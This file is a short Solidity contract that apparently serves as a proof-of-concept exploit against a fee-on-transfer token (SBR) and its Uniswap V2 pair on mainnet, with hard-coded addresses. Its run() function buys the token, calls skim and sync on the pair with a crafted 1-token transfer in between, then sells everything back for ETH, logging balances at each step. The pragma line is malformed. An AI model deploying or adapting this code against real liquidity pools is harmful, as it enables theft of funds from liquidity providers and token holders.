pragma solidity "'^0.8.20;
interface IERC20 { function balanceOf(address) external view returns (uint); }
interface IRouter {
 function swapExactETHForTokensSupportingFeeOnTransferTokens(uint,address[] calldata,address,uint) external payable;
 function swapExactTokensForETHSupportingFeeOnTransferTokens(uint,uint,address[] calldata,address,uint) external;
}
interface IPair { function skim(address) external; function sync() external; }
contract C {
 address constant SBR=0x460B1AE257118Ed6F63Ed8489657588a326a206D;
 address constant WETH=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
 address constant ROUTER=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
 address constant PAIR=0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2;
 receive() external payable {}
 function run() external payable returns (uint beforeBal,uint afterBuy,uint afterSkim,uint ethAfter){
   beforeBal = IERC20(SBR).balanceOf(address(this));
   address[] memory path = new address[](2); path[0]=WETH; path[1]=SBR;
   IRouter(ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(0,path,address(this),block.timestamp+100);
   afterBuy = IERC20(SBR).balanceOf(address(this));
   IPair(PAIR).skim(PAIR);
   afterSkim = IERC20(SBR).balanceOf(address(this));
   (bool s,) = SBR.call(abi.encodeWithSelector(0xa9059cbb, PAIR, 1)); require(s);
   IPair(PAIR).sync();
   (s,) = SBR.call(abi.encodeWithSelector(0x095ea7b3, ROUTER, type(uint).max)); require(s);
   uint bal = IERC20(SBR).balanceOf(address(this));
   path[0]=SBR; path[1]=WETH;
   IRouter(ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(bal,0,path,address(this),block.timestamp+100);
   ethAfter = address(this).balance;
 }
}
